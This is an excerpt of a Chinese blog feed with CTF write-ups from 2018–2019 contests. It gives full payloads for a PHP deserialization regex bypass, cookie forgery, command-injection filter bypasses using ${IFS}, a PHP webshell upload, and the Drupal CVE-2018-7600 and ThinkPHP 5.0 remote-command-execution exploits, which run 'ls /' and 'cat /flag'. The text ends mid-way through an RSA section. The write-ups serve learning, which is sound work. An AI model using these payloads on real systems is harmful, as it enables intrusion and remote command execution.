title="HTTP状态码"></a>HTTP状态码</h3><p>客户端发出HTTP请求，服务器端接收后，会向客户端发送响应信息，HTTP响应的第一行最重要的就是HTTP状态码；状态码由三位数字组成，第一位数字定义了响应的类别，且只有一下5种</p><ul><li>1xx：信息提示，表示请求被成功接收，继续处理，范围：100~101；</li><li>2xx：成功，服务器成功处理了请求，范围：200~206；</li><li>3xx：重定向，用于告诉浏览器客户端，它们的访问资源已经被移动，并告诉客户端新的资源地址位置，范围：300~305；</li><li>4xx：客户端错误代码，客户端发送了一些服务器无法处理的东西，范围：400~415；</li><li>5xx：Web服务器自身出现了错误，用于描述服务器的内部错误，范围：500~505；</li></ul><p>常见的状态码：</p><ul><li><p>200：客户端请求成功；</p></li><li><p>302：重定向；</p></li><li><p>404：请求资源不存在；</p></li><li><p>400：客户端请求有语法错误；</p></li><li><p>401：请求未经授权；</p></li><li><p>403：服务器收到请求但是拒绝提供服务；</p></li><li><p>500：服务器内部错误；</p></li><li><p>503：服务器当前无法处理客户端的请求，一段时间以后可能恢复正常；</p></li></ul><h3 id="HTTP消息"><a href="#HTTP消息" class="headerlink" title="HTTP消息"></a>HTTP消息</h3><p>又称HTTP头（HTTP header），由四部分组成：请求头，响应头，普通头，实体头；</p><ol><li><p>请求头：</p><ol><li><p>Host</p><p>主要用于指定被请求资源的Internet主机和端口号；</p></li><li><p>User-Agent</p><p>允许客户端将自己的操作系统，浏览器和其他属性告诉服务器；</p></li><li><p>Referer</p><p>Referer包含一个URL，代表当前访问URL的上一个URL；</p></li><li><p>Cookie</p><p>一段文本用来表示请求者身份等；</p></li><li><p>Range</p><p>可以请求实体的部分内容，多线程下载时会用到这个请求头；</p></li><li><p>x-forward-for</p><p>即XXF头，代表请求端的IP，可以有多个，中间以逗号隔开；</p></li><li><p>Accept</p><p>用于指定客户端接收哪些MIME类型的信息；</p></li><li><p>Accept-Charset</p><p>用于指定客户端接收的字符集</p></li></ol></li><li><p>响应头</p><ol><li><p>Server</p><p>服务器所使用的Web服务器的名称；</p></li><li><p>Set-Cookie</p><p>向客户端设置Cookie；</p></li></ol></li><li><p>实体头</p><ol><li><p>Content-Type</p><p>实体头用于向接收方指示实体的介质类型；</p></li><li><p>Content-Length</p><p>指明实体正文的长度；</p></li></ol></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>学无止境，身为萌新，没有学到的知识还有很多很多，希望在日后的学习中这个归纳对我会有所帮助。</p><hr><p>参考书籍：《Web安全深度剖析》《计算机网络》</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;你知道平时输入一个网址，简单地按下回车以后，客户端和服务端是怎样复杂运作的吗？
    
    </summary>
    
      <category term="Web安全学习笔记" scheme="https://gardenia30.top/categories/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="HTTP" scheme="https://gardenia30.top/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>2018安恒杯12月月赛复现</title>
    <link href="https://gardenia30.top/2019/01/19/%E5%AE%89%E6%81%9212%E6%9C%88%E6%9C%88%E8%B5%9B/"/>
    <id>https://gardenia30.top/2019/01/19/安恒12月月赛/</id>
    <published>2019-01-19T09:07:40.000Z</published>
    <updated>2019-01-19T15:00:46.626Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>萌新因为种种原因没有做安恒12月的月赛题，正巧这几天发现复现，又学到了新知识！<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>题目<code>index.php</code>给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br><span class="line">    <span class="keyword">if</span>(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题一开始没看懂到底是啥意思，一开始定义了一个baby类，然后在下面完全没有用到有关这个类的任何东西，所以身为萌新的我一脸蒙圈……后来经过仔细地阅读代码，大量的查阅资料，现了其中的猫腻……</p><p><strong>分析：</strong></p><ol><li><p>代码一开始包含文件<code>flag.php</code>；</p></li><li><p>然后定义了一个类，类成员变量<code>$file</code>,重写<code>__toString()</code>方法，这个方法就是将以<code>$filename</code>为文件名的文件输出；</p></li><li><p>接着对<code>data</code>进行正则匹配<code>preg_match(&#39;/[oc]:\d+:/i&#39;,$data,$matches)</code>，匹配结果放入<code>$matches</code>，匹配成功就<code>die(&#39;Hacker!&#39;)</code>，不成功就对输入的<code>$data</code>进行反序列化并输出；</p></li></ol><p><strong>解题方法：</strong></p><p>其实这个题理解了以后就不难了，目标是输出<code>flag.php</code>的内容，所以构造的<code>data</code>肯定也与包含的文件名相关；</p><p>先对<code>flag.php</code>进行序列化并输出，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=<span class="keyword">new</span> baby();</span><br><span class="line">$a-&gt;file=<span class="string">'flag.php'</span>;</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span>($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong><em>测试结果输出：</em></strong><code>O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>直接GET这个值会匹配正则表达式，所以就要想办法绕过；</p><p><strong>绕过方法</strong>：该函数设计的初衷是为了不让<code>Object</code>类型被反序列化，然而正则不够严谨，我们可以在对象长度前加一个<code>+</code>号，即<code>O:4 -&gt; O:+4</code>，即可绕过这层检测，从而使得我们可控的数据传入<code>unserialize</code>函数；</p><p>构造如下：<code>O:+4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><p>将这个字符传入<code>unserialize</code>函数以后会直接反序列化出一个<code>baby</code>的对象<code>$good</code>，<code>$good-&gt;file</code>是<code>flag.php</code>，反序列化后会直接默认调用魔术方法<code>__toString()</code>输出文件内容；</p><p>所以归根结底还是一个正则绕过+反序列化的问题，将构造的<code>data</code>经过URL编码以后GET进去即可得到flag；(不知道为啥直接在浏览器里传参没用，所以就用bp构造GET了一下)</p><p><code>payload:?data=O%3A%2b4%3A%22baby%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</code></p><p><img src="https://s2.ax1x.com/2019/01/19/kCMhtS.png" alt="kCMhtS.png"></p><p>反序列化漏洞参考链接：</p><p><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167721.html</a></p><p><a href="https://xz.aliyun.com/t/3017" target="_blank" rel="noopener">https://xz.aliyun.com/t/3017</a></p><p><a href="https://paper.seebug.org/39/" target="_blank" rel="noopener">https://paper.seebug.org/39/</a></p><h3 id="easyweb2"><a href="#easyweb2" class="headerlink" title="easyweb2"></a>easyweb2</h3><p>这题拿到以后没有切入点…老办法…扫一波目录，发现<code>admin.php</code>和<code>config.php</code></p><p><img src="https://s2.ax1x.com/2019/01/19/kCJwDJ.png" alt="kCJwDJ.png"></p><p>进入<code>admin.php</code>发现<code>You are not admin…</code>，基本定下思路就是伪造管理员身份登录，查看请求头中的信息发现cookie的<code>user=dXNlcg%3D%3D</code>推测为base64编码，解码为<code>user</code></p><p><img src="https://s2.ax1x.com/2019/01/19/kCJIUI.png" alt="kCJIUI.png"></p><p>要求以管理员身份登录，于是伪造<code>user</code>为<code>admin</code>，base64编码一下修改cookie的值为<code>YWRtaW4=</code>；刷新网页后发现进入了如下界面；</p><p><img src="https://s2.ax1x.com/2019/01/19/kCYCGV.png" alt="kCYCGV.png"></p><p>输入<code>ls</code>发现回显；</p><p><img src="https://s2.ax1x.com/2019/01/19/kCYeaR.png" alt="kCYeaR.png"></p><p>输入<code>ls /</code>想查看根目录报错<code>error</code>，输入<code>cat admin.php</code>报错，设想是过滤了空格，Google了一下空格的绕过方式如下：<strong>IFS的默认值为：空白（包括：空格，tab, 和新行)</strong></p><p><img src="https://s2.ax1x.com/2019/01/19/kCtlYq.md.png" alt="kCtlYq.md.png"></p><p>用<code>${IFS}</code>尝试绕过，输入<code>ls${IFS}/</code>,发现回显中有flag信息：</p><p><img src="https://s2.ax1x.com/2019/01/19/kCto1f.png" alt="kCto1f.png"></p><p>直接<code>cat${IFS}/ffLAG_404</code>得到flag：</p><p><img src="https://s2.ax1x.com/2019/01/19/kCtbng.png" alt="kCtbng.png"></p><p>事后想查看admin.php和config.php的内容，发现<code>${IFS}</code>无效，于是尝试<code>&lt;&gt;</code>成功，直接<code>cat&lt;&gt;admin.php和config.php</code>即可；</p><p><strong>admin.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'admin'</span>])||$_SESSION[<span class="string">'admin'</span>]===<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"You are not admin..."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'cmd'</span>]) &#123;</span><br><span class="line">$cmd = waf_exec($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">$retval = <span class="keyword">array</span>();</span><br><span class="line">exec($cmd, $retval, $status);</span><br><span class="line"><span class="comment">// var_dump($retval);</span></span><br><span class="line"><span class="keyword">if</span> ($status == <span class="number">0</span>) &#123;</span><br><span class="line">$res = implode(<span class="string">"\n"</span>,$retval);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$res = <span class="string">'error'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$res = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'./templates/admin.html'</span>;</span><br></pre></td></tr></table></figure><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+| )/i"</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现确实用<code>waf_exec()</code>函数过滤了<code>空格，&gt;，{，}</code>等一系列符号，但是没有过滤<code>&lt; / $</code>，所以可以直接用<code>&lt;和$IFS</code>绕过即可；</p><p>参考链接：<a href="http://www.k0rz3n.com/2017/07/30/cookie/#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8Ccookie-%E6%AC%BA%E9%AA%97" target="_blank" rel="noopener">cookie欺骗</a>，<a href="https://www.anquanke.com/post/id/84920" target="_blank" rel="noopener">命令执行的绕过技巧</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="juju"><a href="#juju" class="headerlink" title="juju"></a>juju</h3><p>拿到图片丢进16进制编辑器，查找flag无果，发现是png图片就查看一下文件头，发现貌似没什么问题，看到图片的高度和长度不一样，于是都改成04，图片的下一截显现出来：</p><p><img src="https://s2.ax1x.com/2019/01/19/kCN7P1.png" alt="kCN7P1.png"></p><p>得到的编码为base32，直接解码md5一下即可</p><p><img src="https://s2.ax1x.com/2019/01/19/kCNfrF.png" alt="kCNfrF.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;萌新因为种种原因没有做安恒12月的月赛题，正巧这几天发现复现，又学到了新知识！
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>CUMT-CTF第一次双月赛Writeup</title>
    <link href="https://gardenia30.top/2019/01/14/CUMT-CTF%E5%8F%8C%E6%9C%88%E8%B5%9BWriteup/"/>
    <id>https://gardenia30.top/2019/01/14/CUMT-CTF双月赛Writeup/</id>
    <published>2019-01-14T07:01:43.000Z</published>
    <updated>2019-01-16T14:56:13.546Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知其然，知其所以然<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez-upload"></a>ez-upload</h3><p>题目描述是可以上传图片的，就随手上传一张图片上去<br><img src="https://s1.ax1x.com/2018/12/16/FdJD6P.png" alt=""></p><p>回显出目录结构如下：<br><img src="https://s1.ax1x.com/2018/12/16/FdJym8.png" alt=""></p><p>访问URL发现可以看到上传的图片：<br><img src="https://s1.ax1x.com/2018/12/16/FdNWfH.png" alt=""><br>知道了上传目录，现在要做的就是上传成功一个Web Shell。</p><p>连接Cknife，写了个php小马，上传发现不可以上传以php结尾的文件。</p><p>第一次抓包尝试加00截断，未果。</p><p>第二次将后缀改成1.php.abc可以成功上传，但是设置Cknife需要连接的时候发现connection：close，应该是不能将上传的1.php.abc成功解析,未果。</p><p>第三次将后缀改成php5，可以上传成功，连接Cknife，成功进入，应该这次可以将haha.php5成功解析：<br><img src="https://s1.ax1x.com/2018/12/16/Fdd9FU.png" alt=""><br><img src="https://s1.ax1x.com/2018/12/16/Fdaxe0.png" alt=""></p><p>在upload文件夹中找了半天，全都是别人上传的文件，最后在根目录发现了flag：<br><img src="https://s1.ax1x.com/2018/12/16/FddrXn.png" alt=""><br><img src="https://s1.ax1x.com/2018/12/16/Fdw8CF.png" alt=""></p><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>hint不需要扣分，就窥视了一下，提示是drupal7的CVE漏洞。</p><p>Google一波，看看大佬写的博客，贴个链接：</p><p><a href="https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#Drupal7-" target="_blank" rel="noopener">https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#Drupal7-</a></p><p><a href="https://www.jianshu.com/p/7c410db788ed" target="_blank" rel="noopener">https://www.jianshu.com/p/7c410db788ed</a></p><p>先创建账号，发现不可以发送email，Google到的结果告诉我更换新密码的页面是存在漏洞的，所以输入用户名的时候直接拿bp截断，构造post：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?q=user%2Fpassword&amp;name%5B%23post_render%5D%5B%5D=system&amp;name%5B%23markup%5D=ls%20/&amp;name%5B%23type%5D=markup</span><br><span class="line"></span><br><span class="line">form_id=user_pass&amp;_triggering_element_name=name</span><br></pre></td></tr></table></figure><p>这里原来的命令需要修改，将其改为ls%20/，目的是查看根目录，Go一下回显form_build_id：</p><p><img src="https://s1.ax1x.com/2018/12/16/FdWuDO.png" alt=""></p><p>保留这个form_build_id，用Hackbar post一下这个form_build_id，如下图：</p><p><img src="https://s1.ax1x.com/2018/12/16/FdW2rT.png" alt=""></p><p>抓包截断，go一下回显根目录，发现flag文件，</p><p><img src="https://s1.ax1x.com/2018/12/16/FdWsGn.png" alt=""></p><p>下一步就是尝试打开这个flag文件，所以重复上述操作，将之前的ls命令换成<code>cat%20/flag</code>即可。（需要注意的是这里的空格需要使用url编码%20，之前没有注意到这个点，导致回显不出数据）</p><p><img src="https://s1.ax1x.com/2018/12/16/FdWECR.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/12/16/FdWiE4.png" alt=""></p><h3 id="tp5"><a href="#tp5" class="headerlink" title="tp5"></a>tp5</h3><p>是个新题正好是前段时间爆出来的新漏洞：ThinkPHP 5.0 &amp; 5.1远程命令执行漏洞，前些日子看合天公众号推送了一篇类似的文章正好派上用场：<a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652849500&amp;idx=1&amp;sn=faf67baccbc970a179e679ea378fdc92&amp;chksm=bd5939918a2eb087cd34eff02f4bb0186190f15dda841e299923717de222df913db1a89acb1d&amp;mpshare=1&amp;scene=23&amp;srcid=1216eedEBA61VyEXXfPPHC1R#rd" target="_blank" rel="noopener">click here</a></p><p>题目提示是tp5.0版本，文章直接有payload：</p><p><code>命令执行：</code></p><p><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=[系统命令]</code></p><p>先<code>ls /</code>列出根目录下的所有目录，发现flag文件；</p><p><a href="https://imgchr.com/i/Fxggu6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/14/Fxggu6.md.png" alt="Fxggu6.md.png"></a></p><p>然后直接查看flag文件即可：</p><p><img src="https://s2.ax1x.com/2019/01/14/FxgqDf.png" alt="FxgqDf.png"></p><p>payload:</p><p><code>http://219.219.61.234:10005/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>之前还没有认真学习过密码学的东西，好在期末好好复习了密码学，现在已经对密码学的知识有了个初步的认识，来温习一下上次的crypto</p><h3 id="现代密码签到题"><a href="#现代密码签到题" class="headerlink" title="现代密码签到题"></a>现代密码签到题</h3><p>拿到这题，看到<code>n,c1,c2,e1,e2</code>基本已经锁定这一题就是RSA的共模攻击，但是所给的参数全部都是字母，按理说应该都是数字才对，所以最难的工作就是将这一堆的字母转化为可用的数字；</p><p>先统计一下字母的出现频率：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">n=<span class="string">"ZZTOBOTBBISBBSOIIAbZAbZOAgObAEEgIBSBgBTIZAEgZTTZZbBEIOTEASTBBBAOEIZgETBSATESOZgZAZOZbTOIbSSIBIgOSZAEOTTgOOATSSBAbbAgOAAOOIOZAIAIABSZBEZBbABEIEOTOZbIbOSTZTAbgBATEbIIIAgSOBTgBBbgTObEATSOIgEISBEIITbEZTIOTOOTBTZZBOIbABOIZTbTTEgEbAggZgSEOAIbSgBbBbOZTESAZIbAZZSbSgEAASgOISIbIgZTbIEbOTgOZBEISAZBSTgTTBSgbIZSgbZBZESEbTgEZTTTEEOETZTOOAAOTZbZIgTZEISBbEZASggIBIgBESTZbZZAOASgOESAOBASAITBBObZZbZIbASIOIAObOSBbBIZZAIOEBBOgOITAAZOIATTSZAOBSSAIZgTBgTbOgOZEOOBgBOAbZTEgOgOOTBSZBIBATAOEOTTObggbATbATEbEOISIOZIIBgSbTETbTEgAIESAZITbgZbgbOAAgbgbgSEOBSObAEbSTEIAZSbSSTEABTSBESOTOETESbgAABABOEgBbAEBZEEgZIbZbbbTObTESbTABBBTISOBgZSEIIISABOI"</span></span><br><span class="line">c1=<span class="string">"ZZEZZOESZTSbbEZETOAIbAbBgETTOASIgEESOgEZATOIgIEABAEOEEEBOTbZIObOESAZbIZTSBgSbZbZBbgbAOBZZABbATOIZIIAgAZAABSSTIEbIOOTAZIZgEbTSSIbEEBBZZIgSZBOEIETgAggIIEbOABIAOgIBBAZATIZIgBAOZbESEbEEBBBbZSOAgZbBZTEgAEbAIOOIEAEbbSIIbITZOTZSBSSABABbbbgOOBATBBTZIEAgSSSbbZOIgBTgOBISOIIIEZZZggbIZEEOSSEEOOgEZSgbAETTTgBBgZTOEIbISZIBSZBOSgSbBIIZIgSbEBBEEIZBgbEEOISbZgBbZIbTAbBAESEgIgSATSSBIZTgZOgZSTObBAZBOBgIATbZIggOIIOSAgSSBIbSEAgTTbTSZbTEgSOOgSTSEATBZOEBTOTEABEgZBAZSObbSEbEbIABZTTABgZETOgbgSZOTAOEOAZBTASbSSSSOBgEEETZTBZEZTSObSbgOIOTTZSETAgTSAITbAEIIAZgOSZZIbZgIIgBgEZOgZbITTgZbASZSEgOIATBgIOBOISgZBTBZOESbABbIIIBgIZOASAbAgSgBEZSbbOSIEbI"</span></span><br><span class="line">c2=<span class="string">"IBTOZOIOOASIBTOISSSbSABbgIbAZEgAgBZBESbbgZbZIATZEOZIZTEIEOggEBbTSZZbASBSSSZIOAZSgTZAZgAIBAAgZTEAIOSESEBTgBSgEIOEbTIIBSAZbSbZEgOSObbBOSbbSTSIBOEZbgIObBBOTAbTbgOOEATBgOOTgIOggSgOZEgSIEgZSAAgTABBIAOTSgOAOITATISBSSTZBABATESSbAgOSbSASOObZbbATObAAgIZBAISBEATBTgbIgATZbbZSgTBgTBSgbZgZZZEBTOIIEAOTgTZOAIAZZBAIAObbIgEOTIAgSEOAbIZEAIOSZgBTASSbISgEOOZESEbBZEBOIAggZbgTTEESTIBbOBTASZTATSOOBAObAOAIgEbSOIISSAAZIIBEOETSOSbSEAbIZBbTEZTAOgBETOZTAOBZZbTIIABOASbIgAgTbbTIBASBbIZEbSTZBSbOAObIBTSbSEgOgSbTBZZEZBgIAObSEETTgTTEEAAAbAOESISIBTTSABTbAgBIggTBZbZEbEbITZbSTgTgBZBAEITgbEOBBBTZgAOTZEBAgbbSOgBTTZOAZBTOBZITIISZSTgBgOOTBbTEEIbgBEgT"</span></span><br><span class="line">e1=<span class="string">"IIIBTZBg"</span></span><br><span class="line">e2=<span class="string">"gbATZgI"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_each_char_1</span><span class="params">(string)</span>:</span></span><br><span class="line">    res = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            res[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res[i] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"n:"</span>+str((count_each_char_1(n)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c1:"</span>+str((count_each_char_1(c1)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c2:"</span>+str((count_each_char_1(c2)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"e1:"</span>+str((count_each_char_1(e1)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"e2:"</span>+str((count_each_char_1(e2)))</span><br></pre></td></tr></table></figure><p><strong>Result</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n:&#123;&apos;A&apos;: 65, &apos;B&apos;: 63, &apos;E&apos;: 56, &apos;g&apos;: 52, &apos;I&apos;: 60, &apos;O&apos;: 72, &apos;S&apos;: 56, &apos;b&apos;: 62, &apos;T&apos;: 69, &apos;Z&apos;: 62&#125;</span><br><span class="line">c1:&#123;&apos;A&apos;: 55, &apos;b&apos;: 62, &apos;E&apos;: 66, &apos;g&apos;: 60, &apos;I&apos;: 67, &apos;O&apos;: 58, &apos;S&apos;: 65, &apos;B&apos;: 59, &apos;T&apos;: 53, &apos;Z&apos;: 72&#125;</span><br><span class="line">c2:&#123;&apos;A&apos;: 67, &apos;B&apos;: 61, &apos;E&apos;: 51, &apos;g&apos;: 60, &apos;I&apos;: 57, &apos;O&apos;: 63, &apos;S&apos;: 66, &apos;b&apos;: 63, &apos;T&apos;: 70, &apos;Z&apos;: 